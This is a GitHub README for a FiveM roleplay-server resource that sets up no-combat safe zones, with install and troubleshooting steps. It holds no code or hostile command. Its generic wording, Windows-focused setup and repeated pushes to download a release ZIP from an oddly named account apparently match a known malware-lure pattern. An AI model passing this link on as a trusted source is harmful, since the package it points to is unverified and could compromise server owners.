# 🛡️ f5_safezones - Easy Safe Zones for FiveM

[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)

## 🚀 Getting Started

f5_safezones adds safe zones to your FiveM server. It helps you define places where players cannot fight, steal, or cause trouble. It works with common FiveM setups and fits roleplay servers that need quiet areas.

Use the link below to visit the release page and download the latest version.

[Visit the releases page to download](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)

## 📥 Download

1. Open the [releases page](https://github.com/Spongecanceroftheliver64/f5_safezones/releases).
2. Find the latest release.
3. Download the file that matches the release package.
4. Save it to a folder you can find later, such as Downloads or Desktop.

If the release comes as a ZIP file, you will need to extract it before use. Windows can do this without extra tools in most cases.

## 🖥️ Windows Setup

1. Download the release from the link above.
2. Right-click the ZIP file.
3. Choose Extract All.
4. Open the extracted folder.
5. Look for the resource folder named `f5_safezones`.
6. Move that folder into your FiveM server resources folder.

A common path looks like this:

`server-data/resources/[local]/f5_safezones`

If you keep your server files in a different place, use that server's resources folder instead.

## ⚙️ Add It to Your Server

1. Open your server configuration file.
2. Add the resource start line:

`ensure f5_safezones`

3. Save the file.
4. Restart your server.

If your server uses a resource order file, add `f5_safezones` in the same place you start your other resources.

## 🔧 Basic Use

f5_safezones is built for simple setup. After you place the resource in your server and start it, you can use it to mark safe areas such as:

- spawn points
- shops
- hospitals
- police stations
- event areas
- player hubs

These zones are useful when you want players to focus on roleplay instead of combat in key places.

## 🧩 Supported Server Types

This resource is built for a wide range of FiveM servers and framework setups, including:

- ESX
- ESX Legacy
- QBCore
- Qbox
- Standalone use

It also fits servers that use ox_lib and common FiveM resource setups. That makes it easier to add to an existing server without changing your whole setup.

## 🛡️ Main Features

- Safe zones for key map areas
- Easy start and stop setup
- Works with common roleplay server frameworks
- Good fit for public spawn areas
- Helps reduce combat in protected places
- Simple install for Windows users
- Made for FiveM and GTA V roleplay servers

## 📌 Common Use Cases

Use f5_safezones when you want to:

- protect spawn areas from attacks
- keep hospitals calm
- stop fights inside shops
- create event zones with no combat
- protect job locations
- give new players a safe place to load in

This helps create a smoother player flow and keeps busy areas under control.

## 🧪 Requirements

Before you install, make sure you have:

- a working FiveM server
- access to your server files on Windows
- a place to edit your server config
- enough permissions to add resources
- the latest FiveM build for your server

A standard Windows PC is enough for setup. You do not need special hardware for the install.

## 🪟 Windows Install Guide

1. Go to the [releases page](https://github.com/Spongecanceroftheliver64/f5_safezones/releases).
2. Download the latest release package.
3. Extract the file if it is compressed.
4. Copy the `f5_safezones` folder into your server resources folder.
5. Open your server config file.
6. Add `ensure f5_safezones`.
7. Save the file.
8. Start or restart the server.
9. Join the server and test a safe zone area.

If the resource does not start, check that the folder name matches the name in your config line.

## 🧭 Folder Placement Example

A common server layout looks like this:

- `server-data`
  - `resources`
    - `[local]`
      - `f5_safezones`

This is only an example. Your server may use a different folder structure. Place the resource with your other custom resources.

## 🔍 Troubleshooting

### The resource does not start

- Check the folder name
- Make sure `ensure f5_safezones` is in your config
- Confirm the folder is inside your resources directory
- Restart the server after changes

### The safe zone does not work in game

- Confirm the resource started without errors
- Check for load order issues
- Make sure no other resource is blocking the same area
- Test with only this resource active if needed

### I cannot find the release file

- Open the [releases page](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)
- Look at the newest release at the top
- Download the attached asset from that release

## 📚 What This Resource Is For

This resource is for server owners who want clear control over protected areas. It helps keep roleplay spaces safe and lowers the chance of combat where it does not belong. It is useful for public servers, private servers, and community servers that want more order in shared spaces.

## 🧱 Project Topics

This project fits topics like:

- cfx
- cfxre
- esx
- esx-legacy
- fivem
- fivem-resource
- fivem-scripts
- greenzone
- gta5
- gtav
- lua
- ox-lib
- pvp
- qbcore
- qbcore-framework
- qbox
- roleplay
- safezone
- standalone

## 📄 File Name

Repository: `f5_safezones`

Description: The most advanced open-source safezone system for FiveM

Primary download page: [https://github.com/Spongecanceroftheliver64/f5_safezones/releases](https://github.com/Spongecanceroftheliver64/f5_safezones/releases)

## 🔑 Quick Setup Checklist

1. Visit the releases page.
2. Download the latest release.
3. Extract the files if needed.
4. Copy the resource folder into your server resources.
5. Add `ensure f5_safezones` to your config.
6. Restart the server.
7. Test the safe zone in game